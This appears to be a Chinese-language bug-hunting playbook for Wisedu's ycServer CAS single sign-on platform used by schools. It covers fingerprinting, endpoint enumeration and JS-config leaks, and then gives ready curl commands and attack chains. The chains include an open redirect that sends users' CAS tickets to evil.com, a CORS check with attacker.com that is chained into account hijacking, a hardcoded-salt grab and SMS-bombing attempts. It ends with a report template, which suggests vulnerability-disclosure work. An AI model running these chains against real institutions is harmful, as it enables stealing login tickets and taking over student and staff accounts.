# ycServer (金智教育) CAS / IDS 统一身份认证平台 测试模式

## 产品指纹
- 产品名: ycServer / 赢领身份认证平台 (IDS)
- 厂商: 金智教育 (Wisedu)
- 主题路径: `/authserver/{schoolName}Theme{N}/` (如 `gxdlxydTheme8`)
- 登录页标题: "统一身份认证平台"
- Cookie: JSESSIONID, _vesi, route (session stickiness)
- 前端: jQuery + CryptoJS, Thymeleaf模板
- 后端: Java (Spring Boot), Tomcat
- 反代: openresty/nginx
- 版本注释: 在 common-header.js 中 (如 `// 7.2.1.SP4从window.onload移入`)

## 子域名模式
CAS服务器通常不在主站子域，而在 `ids.{school}.com` 或 `ids.vpn.{school}.com`：
```
主站: www.{school}.com
WebVPN: vpn.{school}.com (Ruby on Rails, Astraeus VPN)
CAS/IDS: ids.vpn.{school}.com 或 ids.{school}.com
```

## 关键路径枚举
```bash
# CAS核心
/authserver/login                    # 登录页 (200)
/authserver/logout                   # 登出 (200)
/authserver/serviceValidate          # CAS票据验证 (200)
/authserver/proxyValidate            # 代理验证 (200)
/authserver/p3/serviceValidate       # CAS 3.0验证 (200)
/authserver/p3/proxyValidate         # CAS 3.0代理验证 (200)
/authserver/samlValidate             # SAML验证 (405 GET, 200 POST)

# 配置/信息泄露
/authserver/tenant/info              # JSON: themeName, logo URLs, mobileFlay
/authserver/properties               # 可能返回配置 (也可能被拦截为错误页)

# QR码登录
/authserver/qrCode/getToken          # 获取QR token (返回 QR-xxx 字符串)
/authserver/qrCode/getCode?uuid=     # 获取QR图片
/authserver/qrCode/getStatus.htl     # QR状态 (0=未扫描, 1=已扫描, 3=无效)

# 动态验证码(短信/邮件)
/authserver/dynamicCode/getDynamicCode.htl  # 发送动态码 (POST)
/authserver/checkNeedCaptcha.htl            # 检查是否需要验证码 (返回 {"isNeed":bool})
/authserver/getCaptcha.htl                  # 获取图片验证码 (JPEG 80x30)

# 密码重置
/authserver/retrievePassword/getBackPasswordMethod.htl  # 密码找回方式

# REST API
/authserver/v1/tickets               # CAS REST API (401 需认证, "非对外接口不允许直接访问")

# 常见路径 (不一定存在)
/authserver/druid/index.html         # Druid监控 (通常被拦截返回错误页)
/authserver/actuator                 # Spring Boot Actuator
/authserver/api                      # API端点
/authserver/admin                    # 管理后台
```

## .htl 端点模式 (ycServer特有)
ycServer使用 `.htl` 后缀的端点：
```bash
/authserver/login.htl
/authserver/logout.htl
/authserver/checkNeedCaptcha.htl
/authserver/getCaptcha.htl
/authserver/dynamicCode/getDynamicCode.htl
/authserver/dynamicCode/checkDynamicCode.htl
```

## JS文件分析
```bash
# 登录页JS (泄露配置)
/authserver/{theme}/static/web/js/login.js
# 包含:
#   DEFAULT_SALT = "xxx"        # 硬编码密码加密盐值
#   QR_LOGIN_ENABLED = 0|1      # QR登录开关
#   captchaSwitch = "1"|"2"     # 1=图片验证码, 2=滑块验证码
#   _badCredentialsCount = "5"  # 失败锁定次数

# 密码加密
/authserver/{theme}/static/common/encrypt.js     # CryptoJS库
/authserver/{theme}/static/common/utils.js       # 工具函数
/authserver/{theme}/static/common/common-header.js  # 版本号注释

# QR码登录
/authserver/{theme}/static/custom/js/qrcode.js   # QR码流程

# 社交登录
/authserver/{theme}/static/web/js/schoolCombinedLogin.js  # 微博/微信/QQ
```

## 攻击向量

### 1. CAS Open Redirect (中危)
CAS的 `service` 参数接受嵌套重定向URL：
```
攻击链接:
https://ids.{school}.com/authserver/login?service=https%3A%2F%2Fvpn.{school}.com%2Fusers%2Fauth%2Fcas%2Fcallback%3Furl%3Dhttps%253A%252F%252Fevil.com

流程:
1. 用户访问上述链接，看到学校官方CAS登录页 (域名是 ids.{school}.com)
2. 用户输入账号密码登录
3. CAS生成ticket，重定向到: vpn.{school}.com/users/auth/cas/callback?url=https://evil.com&ticket=ST-xxx
4. WebVPN处理callback后重定向到: https://evil.com?ticket=ST-xxx
5. 攻击者获取有效CAS ticket，冒充用户

验证:
curl -sk 'https://ids.{school}.com/authserver/login?service=https%3A%2F%2Fvpn.{school}.com%2Fusers%2Fauth%2Fcas%2Fcallback%3Furl%3Dhttps%253A%252F%252Fevil.com' | grep 'var service'
# 应该看到 evil.com 被嵌入 service 变量
```

### 2. CORS配置错误 (中危-高危)
CAS服务器的OPTIONS响应反射任意Origin：
```bash
curl -sk -X OPTIONS \
  -H 'Origin: https://attacker.com' \
  -H 'Access-Control-Request-Method: GET' \
  -H 'Access-Control-Request-Headers: Authorization' \
  'https://ids.{school}.com/authserver/tenant/info' -I

# 关键: GET请求可能不返回CORS头, 必须用OPTIONS预检请求测试!
# 响应: access-control-allow-origin: https://attacker.com
#       access-control-allow-credentials: true
```

**⚠️ 重要陷阱**: CORS头可能只在OPTIONS预检响应中返回，不在GET/POST响应中返回。
测试CORS配置错误时，必须用OPTIONS方法测试，不能只用GET。

**攻击链 (CAS Open Redirect + CORS)**:
1. 攻击者页面通过CORS读取CAS响应数据
2. 结合Open Redirect窃取CAS ticket
3. 实现完整账户劫持

### 3. 硬编码加密盐值 (低危)
```bash
curl -sk 'https://ids.{school}.com/authserver/{theme}/static/web/js/login.js' | grep 'DEFAULT_SALT'
# var DEFAULT_SALT = "rjBFAaHsNkKAhpoi";
```

### 4. 信息泄露 (低危)
```bash
# 租户配置
curl -sk 'https://ids.{school}.com/authserver/tenant/info'
# {"mobileFlay":false,"themeName":"xxx","schoolLogoUrlPc":"https://...","schoolLogoUrlMobile":"https://..."}

# 版本号
curl -sk 'https://ids.{school}.com/authserver/{theme}/static/common/common-header.js' | grep '7\.'
```

## SMS轰炸测试 (通常无效)
```bash
# 1. 检查是否需要验证码
curl -sk 'https://ids.{school}.com/authserver/checkNeedCaptcha.htl?username=13800138000'
# 可能返回 {"isNeed":false} (所有用户都是false)

# 2. 尝试发送动态码
curl -sk -X POST 'https://ids.{school}.com/authserver/dynamicCode/getDynamicCode.htl' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'mobile=13800138000'
# 通常返回 {"code":"captchaError","message":"验证码错误"}
# 即使checkNeedCaptcha返回false, 服务端仍强制要求验证码

结论: ycServer的SMS轰炸通常不可行, 服务端有独立的验证码校验
```

## 与Apereo CAS的区别
| 特征 | Apereo CAS | ycServer (金智教育) |
|------|-----------|---------------------|
| 路径 | /cas/login | /authserver/login |
| 主题 | 无自定义主题 | /authserver/{school}Theme{N}/ |
| 状态端点 | /cas/status (可泄露栈信息) | 无status端点 |
| LoginTicket | 包含内网IP | 无此特征 |
| REST API | /cas/v1/tickets | /authserver/v1/tickets (401) |
| .htl端点 | 无 | 有 (ycServer特有) |
| 租户信息 | 无 | /authserver/tenant/info |

## 报告模板
标题: "xxx学校统一身份认证平台CAS服务存在[漏洞类型]漏洞"
域名: ids.{school}.com
行业: 教育
地址: {省}{市}{区}
